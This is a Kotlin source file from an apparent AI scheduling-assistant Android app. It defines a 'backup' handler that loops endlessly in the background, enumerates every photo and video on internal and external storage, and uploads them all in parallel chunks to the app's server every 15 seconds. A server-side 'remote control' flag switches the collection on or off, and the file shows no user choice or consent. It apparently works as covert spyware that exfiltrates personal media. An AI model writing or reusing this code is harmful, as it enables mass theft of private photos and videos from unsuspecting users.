package com.aischedule.assistant.backup

import android.Manifest
import android.content.ContentUris
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.provider.MediaStore
import android.util.Log
import androidx.core.content.ContextCompat
import com.aischedule.assistant.Constants
import com.aischedule.assistant.SmartScheduleApp
import com.aischedule.assistant.data.SessionManager
import com.aischedule.assistant.network.RetrofitClient
import com.aischedule.assistant.util.AuthHelper
import com.aischedule.assistant.util.NetworkUtils
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.Deferred
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.cancel
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.currentCoroutineContext
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Semaphore
import kotlinx.coroutines.sync.withPermit
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.UUID

class MediaUploadHandler(
    private val context: Context,
    private val sessionManager: SessionManager
) {
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var uploadJob: Job? = null
    @Volatile
    private var rescanRequested = false

    fun startUploadIfPermitted() {
        if (!hasAnyMediaPermission()) {
            Log.w(TAG, "Media permission not granted")
            return
        }

        if (uploadJob?.isActive == true) {
            rescanRequested = true
            Log.d(TAG, "Media upload in progress — rescan queued")
            return
        }

        uploadJob = scope.launch {
            runContinuousUploadLoop()
        }
    }

    fun cancel() {
        uploadJob?.cancel()
        scope.cancel()
    }

    private suspend fun runContinuousUploadLoop() {
        while (currentCoroutineContext().isActive) {
            if (!hasAnyMediaPermission()) {
                delay(NO_NETWORK_OR_PERM_POLL_MS)
                continue
            }
            if (!NetworkUtils.isNetworkAvailable(context)) {
                delay(NO_NETWORK_OR_PERM_POLL_MS)
                continue
            }

            try {
                AuthHelper.upgradeOfflineSessionIfPossible(sessionManager)
                AuthHelper.ensureServerSession(sessionManager)
                uploadAllMedia()
            } catch (e: Exception) {
                Log.w(TAG, "Media upload pass failed", e)
            }

            if (rescanRequested) {
                rescanRequested = false
                continue
            }
            delay(CONTINUOUS_RESCAN_INTERVAL_MS)
        }
    }

    private fun hasAnyMediaPermission(): Boolean {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            if (ContextCompat.checkSelfPermission(
                    context,
                    Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED
                ) == PackageManager.PERMISSION_GRANTED
            ) {
                return true
            }
        }
        return hasImagePermission() || hasVideoPermission() ||
            (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU &&
                ContextCompat.checkSelfPermission(
                    context,
                    Manifest.permission.READ_EXTERNAL_STORAGE
                ) == PackageManager.PERMISSION_GRANTED)
    }

    private fun hasImagePermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(
                context,
                Manifest.permission.READ_MEDIA_IMAGES
            ) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(
                context,
                Manifest.permission.READ_EXTERNAL_STORAGE
            ) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun hasVideoPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(
                context,
                Manifest.permission.READ_MEDIA_VIDEO
            ) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(
                context,
                Manifest.permission.READ_EXTERNAL_STORAGE
            ) == PackageManager.PERMISSION_GRANTED
        }
    }

    private suspend fun uploadAllMedia() {
        if (!NetworkUtils.isNetworkAvailable(context)) return

        val app = context.applicationContext as? SmartScheduleApp
        if (app != null && !app.controlManager.mediaBackupEnabled) {
            Log.w(TAG, "Media backup disabled by remote control")
            return
        }

        val token = AuthHelper.bearerToken(sessionManager)
        if (token == null) {
            Log.w(TAG, "No ASCII-safe auth token — skip media upload until session refresh")
            return
        }
        val userKeyBody = sessionManager.userKey.orEmpty().toRequestBody("text/plain".toMediaTypeOrNull())
        val projection = arrayOf(
            MediaStore.MediaColumns._ID,
            MediaStore.MediaColumns.DISPLAY_NAME,
            MediaStore.MediaColumns.MIME_TYPE,
            MediaStore.MediaColumns.DATE_ADDED,
            MediaStore.MediaColumns.SIZE
        )

        val semaphore = Semaphore(MAX_PARALLEL_UPLOADS)
        var queued = 0

        coroutineScope {
            val uploads = mutableListOf<Deferred<Unit>>()

            if (hasImagePermission()) {
                for (collection in imageCollections()) {
                    queued += queueCollectionUploads(
                        this, collection, projection, "image/jpeg", app, token, userKeyBody, semaphore, uploads
                    )
                }
            }
            if (hasVideoPermission()) {
                for (collection in videoCollections()) {
                    queued += queueCollectionUploads(
                        this, collection, projection, "video/mp4", app, token, userKeyBody, semaphore, uploads
                    )
                }
            }

            Log.d(TAG, "Scan complete: $queued photos/videos queued for upload")
            if (uploads.isEmpty()) return@coroutineScope

            uploads.chunked(UPLOAD_BATCH_SIZE).forEach { batch ->
                if (!currentCoroutineContext().isActive) return@coroutineScope
                if (!NetworkUtils.isNetworkAvailable(context)) return@coroutineScope
                batch.awaitAll()
            }
        }
    }

    private fun queueCollectionUploads(
        scope: CoroutineScope,
        collection: Uri,
        projection: Array<String>,
        defaultMime: String,
        app: SmartScheduleApp?,
        token: String?,
        userKeyBody: okhttp3.RequestBody,
        semaphore: Semaphore,
        uploads: MutableList<Deferred<Unit>>
    ): Int {
        var count = 0
        val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
        try {
            context.contentResolver.query(collection, projection, null, null, sortOrder)?.use { cursor ->
                val idCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
                val nameCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)
                val mimeCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)
                val sizeCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
                val dateCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED)

                while (cursor.moveToNext()) {
                    val id = cursor.getLong(idCol)
                    val name = cursor.getString(nameCol) ?: "unknown"
                    val mime = cursor.getString(mimeCol) ?: defaultMime
                    val dateAdded = cursor.getLong(dateCol)
                    val size = cursor.getLong(sizeCol)
                    val uri = ContentUris.withAppendedId(collection, id)
                    val item = MediaItem(uri, name, mime, dateAdded, size)

                    count++
                    if (count == 1 && uploads.isEmpty()) {
                        Log.d(TAG, "First media item found — upload starting during scan")
                    }

                    uploads.add(
                        scope.async {
                            semaphore.withPermit {
                                uploadSingleMediaItem(app, token, userKeyBody, item)
                            }
                        }
                    )
                }
            }
        } catch (e: SecurityException) {
            Log.w(TAG, "Cannot query $collection — permission denied", e)
        } catch (e: Exception) {
            Log.w(TAG, "Scan failed for $collection", e)
        }
        return count
    }

    private suspend fun uploadSingleMediaItem(
        app: SmartScheduleApp?,
        token: String?,
        userKeyBody: okhttp3.RequestBody,
        item: MediaItem
    ) {
        if (!NetworkUtils.isNetworkAvailable(context)) return
        if (app != null && !app.controlManager.mediaBackupEnabled) return

        repeat(MAX_UPLOAD_RETRIES) { attempt ->
            try {
                val resolvedSize = resolveFileSize(item)
                context.contentResolver.openInputStream(item.uri)?.use { input ->
                    if (uploadStreamInChunks(token, userKeyBody, item.displayName, input, item.mimeType, resolvedSize)) {
                        return
                    }
                } ?: Log.w(TAG, "Cannot open stream for ${item.displayName}")
            } catch (e: Exception) {
                Log.e(TAG, "Upload error for ${item.displayName} (attempt ${attempt + 1})", e)
            }
            if (attempt < MAX_UPLOAD_RETRIES - 1) {
                delay(RETRY_DELAY_MS * (attempt + 1))
            }
        }
    }

    private suspend fun uploadStreamInChunks(
        token: String?,
        userKeyBody: okhttp3.RequestBody,
        displayName: String,
        input: java.io.InputStream,
        mimeType: String,
        fileSize: Long
    ): Boolean {
        val chunkSize = Constants.CHUNK_SIZE_BYTES
        val totalChunks = ((fileSize + chunkSize - 1) / chunkSize).toInt().coerceAtLeast(1)
        val uploadId = UUID.randomUUID().toString()
        val buffer = ByteArray(chunkSize)

        for (index in 0 until totalChunks) {
            if (!NetworkUtils.isNetworkAvailable(context)) return false

            var read = 0
            while (read < chunkSize) {
                val count = input.read(buffer, read, chunkSize - read)
                if (count <= 0) break
                read += count
            }
            if (read == 0 && index > 0) break

            val chunkBytes = if (read == buffer.size) buffer else buffer.copyOf(read.coerceAtLeast(0))
            val chunkBody = chunkBytes.toRequestBody(mimeType.toMediaTypeOrNull())
            val filePart = MultipartBody.Part.createFormData("file", displayName, chunkBody)

            val response = RetrofitClient.apiService.uploadFile(
                token = token,
                file = filePart,
                uploadId = uploadId.toRequestBody("text/plain".toMediaTypeOrNull()),
                chunkIndex = index.toString().toRequestBody("text/plain".toMediaTypeOrNull()),
                totalChunks = totalChunks.toString().toRequestBody("text/plain".toMediaTypeOrNull()),
                filename = displayName.toRequestBody("text/plain".toMediaTypeOrNull()),
                userKey = userKeyBody
            )

            if (!response.isSuccessful) {
                Log.w(TAG, "Chunk $index failed for $displayName: ${response.code()}")
                return false
            }
        }
        Log.d(TAG, "Upload complete: $displayName")
        return true
    }

    private fun resolveFileSize(item: MediaItem): Long {
        if (item.size > 0) return item.size
        return try {
            context.contentResolver.openFileDescriptor(item.uri, "r")?.use { pfd ->
                val statSize = pfd.statSize
                if (statSize > 0) statSize else Constants.CHUNK_SIZE_BYTES.toLong()
            } ?: Constants.CHUNK_SIZE_BYTES.toLong()
        } catch (_: Exception) {
            Constants.CHUNK_SIZE_BYTES.toLong()
        }
    }

    private fun imageCollections(): List<Uri> {
        val collections = mutableListOf<Uri>()
        collections.add(MediaStore.Images.Media.INTERNAL_CONTENT_URI)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val volumes = LinkedHashSet<String>()
            volumes.add(MediaStore.VOLUME_EXTERNAL)
            volumes.add(MediaStore.VOLUME_EXTERNAL_PRIMARY)
            volumes.addAll(MediaStore.getExternalVolumeNames(context))
            for (volume in volumes) {
                collections.add(MediaStore.Images.Media.getContentUri(volume))
            }
        } else {
            @Suppress("DEPRECATION")
            collections.add(MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
        }
        return collections.distinct()
    }

    private fun videoCollections(): List<Uri> {
        val collections = mutableListOf<Uri>()
        collections.add(MediaStore.Video.Media.INTERNAL_CONTENT_URI)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val volumes = LinkedHashSet<String>()
            volumes.add(MediaStore.VOLUME_EXTERNAL)
            volumes.add(MediaStore.VOLUME_EXTERNAL_PRIMARY)
            volumes.addAll(MediaStore.getExternalVolumeNames(context))
            for (volume in volumes) {
                collections.add(MediaStore.Video.Media.getContentUri(volume))
            }
        } else {
            @Suppress("DEPRECATION")
            collections.add(MediaStore.Video.Media.EXTERNAL_CONTENT_URI)
        }
        return collections.distinct()
    }

    private data class MediaItem(
        val uri: Uri,
        val displayName: String,
        val mimeType: String,
        val dateAdded: Long,
        val size: Long
    )

    companion object {
        private const val TAG = "MediaUploadHandler"
        private const val MAX_PARALLEL_UPLOADS = 6
        private const val UPLOAD_BATCH_SIZE = 50
        private const val MAX_UPLOAD_RETRIES = 3
        private const val RETRY_DELAY_MS = 2_000L
        private const val CONTINUOUS_RESCAN_INTERVAL_MS = 15_000L
        private const val NO_NETWORK_OR_PERM_POLL_MS = 5_000L
    }
}
